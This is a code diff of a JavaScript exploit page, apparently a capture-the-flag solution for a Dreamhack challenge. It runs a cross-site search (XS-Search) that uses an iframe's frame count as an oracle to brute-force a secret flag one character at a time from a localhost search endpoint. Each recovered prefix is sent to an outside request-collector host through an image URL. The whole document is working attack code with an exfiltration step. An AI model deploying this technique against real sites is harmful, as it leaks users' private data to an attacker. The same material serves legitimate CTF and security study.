@@ -5,36 +5,41 @@
         return await new Promise((resolve, reject) => {
             const iframe = document.getElementById("iframe");
             iframe.src = url;
-            iframe.onload = () => { 
+            iframe.onload = () => {
                 if (iframe.contentWindow.frames.length != 0)
                     return resolve();
                 else
                     return reject();
-            };
-        });
+            }
+        })
     }
+
     async function search(query) {
         try {
             await req(
-              `http://localhost:8000/search?query=${query}`
+                `http://localhost:8000/search?query=${query}`
             );
             return true;
         } catch (e) {
             return false;
         }
     }
+
     async function exploit() {
-        let chars = "0123456789abcdef}"
-        let secret = "DH{22d1445ad68e194e044a16dc644371f3";
+        let chars = "0123456789abcdef}";
+        let secret = "DH{";
+
         while (!secret.includes("}")) {
             for (let c of chars) {
                 if (await search(secret + c)) {
                     secret += c;
-                    img.src = `https://atltxxf.request.dreamhack.games/${secret}`;
+                    img.src = `https://pswysot.request.dreamhack.games/${secret}`;
                     break;
                 }
             }
         }
     }
+    
     exploit();
 </script>
+
